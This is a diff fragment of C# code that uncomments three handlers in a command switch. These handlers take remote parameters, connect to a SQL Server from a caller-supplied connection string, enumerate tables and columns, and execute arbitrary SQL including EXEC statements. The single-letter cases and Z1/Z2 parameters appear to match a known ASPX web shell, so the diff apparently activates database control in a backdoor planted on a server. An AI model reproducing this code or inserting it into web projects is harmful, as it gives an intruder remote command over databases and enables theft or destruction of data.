@@ -135,24 +135,24 @@ D.Length);
                             }
                         case "O":
                             {
-                                /*string[] x = Z1.Replace("\r", "").Split('\n'); string strConn = x[0], strDb = x[1];
+                                string[] x = Z1.Replace("\r", "").Split('\n'); string strConn = x[0], strDb = x[1];
                                 SqlConnection Conn = new SqlConnection(strConn); Conn.Open();
                                 DataTable dt = Conn.GetSchema("Columns"); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
-                                { R += string.Format("{0}\t", dt.Rows[i][2].ToString()); }*/
+                                { R += string.Format("{0}\t", dt.Rows[i][2].ToString()); }
                                 break;
                             }
                         case "P":
                             {
-                                /*string[] x = Z1.Replace("\r", "").Split('\n'), p = new string[4];
+                                string[] x = Z1.Replace("\r", "").Split('\n'), p = new string[4];
                                 string strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb; p[2] = strTable; SqlConnection Conn = new SqlConnection(strConn);
                                 Conn.Open(); DataTable dt = Conn.GetSchema("Columns", p); Conn.Close(); for (int i = 0; i < dt.Rows.Count; i++)
                                 {
                                     R += string.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
-                                }*/
+                                }
                                 break;
                             }
                         case "Q":
-                            {/*
+                            {
                                 string[] x = Z1.Replace("\r", "").Split('\n');
                                 string strDat, strConn = x[0], strDb = x[1]; int i, c; strDat = Z2.ToUpper(); SqlConnection Conn = new SqlConnection(strConn);
                                 Conn.Open(); if (strDat.IndexOf("SELECT ") == 0 || strDat.IndexOf("EXEC ") == 0 || strDat.IndexOf("DECLARE ") == 0)
@@ -172,7 +172,7 @@ D.Length);
                                     SqlCommand cm = Conn.CreateCommand(); cm.CommandText = Z2; cm.ExecuteNonQuery();
                                     R = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                                 }
-                                Conn.Close();*/
+                                Conn.Close();
                                 break;
                             }
                         default: goto End;
